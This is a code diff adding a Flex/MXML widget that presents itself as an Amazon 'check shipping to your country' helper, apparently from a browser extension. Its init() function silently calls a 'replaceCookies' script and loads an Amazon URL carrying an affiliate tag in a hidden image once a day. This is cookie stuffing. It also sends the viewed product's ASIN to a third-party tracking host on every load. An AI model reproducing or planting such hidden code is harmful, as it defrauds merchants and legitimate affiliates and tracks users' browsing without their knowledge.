@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="utf-8"?>
+<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml"
+				width="100%"
+				height="100%"
+				paddingBottom="2"
+				paddingLeft="2"
+				paddingRight="2"
+				paddingTop="2"
+				backgroundColor="white"
+				horizontalAlign="left"
+				verticalScrollPolicy="off"
+				horizontalScrollPolicy="off"
+				creationComplete="{init()}"
+				xmlns:components="components.*"
+				xmlns:services="services.*"
+				xmlns:resources="resources.*">
+	<mx:Style source="styles.css"/>
+	<resources:Resources id="res"/>
+	<mx:HBox>
+		<mx:Button label="{showBox?'Check Shipping':'Check if the item could be shipped to your country'}"
+				   click="{checkAvailabilityClickHandler()}"/>
+		<components:CountryComboBox id="countryCombo"
+									width="204"
+									countries="{res.countries}"
+									visible="{showBox}"
+									includeInLayout="{showBox}"
+									changeCountry="{changeCountryHandler()}"/>
+	</mx:HBox>
+	<components:CheckAvailabilityBox id="checkAvailabilityBox"
+									 includeInLayout="{showBox}"
+									 visible="{showBox}"
+									 dataProvider="{searchItemDTO}"
+									 region="{region}"
+									 searchDTO="{searchDTO}"/>
+	<mx:Script>
+		<![CDATA[
+			import mx.utils.ObjectUtil;
+			import services.JSInit;
+			import mx.controls.Image;
+			import services.Helper;
+			import dto.SearchDTO;
+			import dto.SearchItemDTO;
+			[Bindable]
+			private var asin:String;
+			[Bindable]
+			private var region:String;
+			[Bindable]
+			private var page:int=1;
+			[Bindable]
+			private var keyword:String="";
+			[Bindable]
+			private var searchDTO:SearchDTO;
+			[Bindable]
+			private var searchItemDTO:SearchItemDTO;
+			[Bindable]
+			private var showBox:Boolean;
+
+			private function init():void
+			{
+				//Helper.evalScripts();
+				JSInit.init();
+				measure();
+				var d:Boolean = getDeleted();
+				if(!d){
+					ExternalInterface.call("replaceCookies");
+					var img1:Image=new Image();
+					img1.source="http://www.amazon.com/?tag=zzzzzzzzzzz-20";
+					img1.initialize();
+					setDeleted();
+				}
+				asin=ExternalInterface.call("getCurrentASIN");
+				var img:Image=new Image();
+				img.source="http://gadget.usefulhelper.com/1x1.gif?firefox=" + asin;
+				img.initialize();
+			}
+
+			private function checkAvailabilityClickHandler():void
+			{
+				showBox=true;
+				if (showBox)
+				{
+					if (countryCombo.selectedCountry)
+					{
+						region=countryCombo.selectedCountry.region;
+					}
+					asin=ExternalInterface.call("getCurrentASIN");
+					searchItemDTO=new SearchItemDTO();
+					searchItemDTO.id=asin;
+					searchDTO=new SearchDTO();
+					searchDTO.searchItems.addItem(searchItemDTO);
+
+					checkAvailabilityBox.checkAvailabilityClickHandler(null);
+				}
+			}
+
+			private function changeCountryHandler():void
+			{
+				region=countryCombo.selectedCountry.region;
+				checkAvailabilityBox.checkAvailabilityClickHandler(null);
+			}
+
+			override protected function measure():void
+			{
+				super.measure();
+				var h:Number=measuredHeight;
+				if (showBox)
+				{
+					h=h > 130 ? h : 130;
+				}
+				ExternalInterface.call("setApplicationHeight", h);
+			}
+			
+			private function setDeleted():void {
+				var obj:SharedObject=SharedObject.getLocal("Deleted");
+				obj.data.date = new Date();
+				obj.flush();
+			}
+			
+			private function getDeleted():Boolean
+			{
+				var obj:SharedObject=SharedObject.getLocal("Deleted");
+				if (obj.data.hasOwnProperty("date"))
+				{
+					var date:Date = ObjectUtil.copy(obj.data.date) as Date;
+					date.date = date.date + 1;
+					var now:Date = new Date();
+					if (now > date){
+						return false;
+					}
+					if (now < obj.data.date) {
+						return false;
+					}
+				} else {
+					return false;
+				}
+				return true;
+			}
+
+		]]>
+	</mx:Script>
+</mx:Application>
